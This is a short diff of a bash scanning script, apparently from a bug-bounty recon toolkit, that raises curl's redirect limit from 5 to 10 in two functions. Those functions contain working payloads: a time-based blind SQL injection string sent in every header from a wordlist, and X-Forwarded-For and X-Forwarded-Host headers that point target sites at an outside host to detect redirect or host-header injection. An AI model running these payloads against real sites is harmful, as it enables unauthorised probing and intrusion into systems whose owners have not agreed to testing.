@@ -222,7 +222,7 @@ checkheadersforsqli(){
 		regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
 		if [[ $url =~ $regex ]]; then 
 			cat ~/tools/__diccionarios/headers.txt | while read head; do
-				response=$(curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -s -I -L -w "%{time_starttransfer}" --max-redirs 5 --connect-timeout 15 --max-time 15 $url)
+				response=$(curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -s -I -L -w "%{time_starttransfer}" --max-redirs 10 --connect-timeout 15 --max-time 15 $url)
 				time=$(echo "$response" | tail -1 | awk -F  "." '{print $1}')
 				if [[ $time =~ '^[0-9]+$' ]] ; then
 					if (($time >= 6)); then
@@ -247,9 +247,9 @@ checkheadersforredirect(){
 	cat $1 | while read url; do
 		regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
 		if [[ $url =~ $regex ]]; then 
-			response=$(curl -X GET -H "X-Forwarded-For: estebancano.com.ar/abc.php?$url" -s -L --max-redirs 5 --connect-timeout 15 --max-time 15 $url)
+			response=$(curl -X GET -H "X-Forwarded-For: estebancano.com.ar/abc.php?$url" -s -L --max-redirs 10 --connect-timeout 15 --max-time 15 $url)
 			grep -q '<!-- CHECK -->' <<< $response && echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php?$url" >> $2
-			response=$(curl -X GET -H "X-Forwarded-Host: estebancano.com.ar/abc.php?$url" -s -L --max-redirs 5 --connect-timeout 15 --max-time 15 $url)
+			response=$(curl -X GET -H "X-Forwarded-Host: estebancano.com.ar/abc.php?$url" -s -L --max-redirs 10 --connect-timeout 15 --max-time 15 $url)
 			grep -q '<!-- CHECK -->' <<< $response && echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php?$url" >> $2
 		fi
 	done
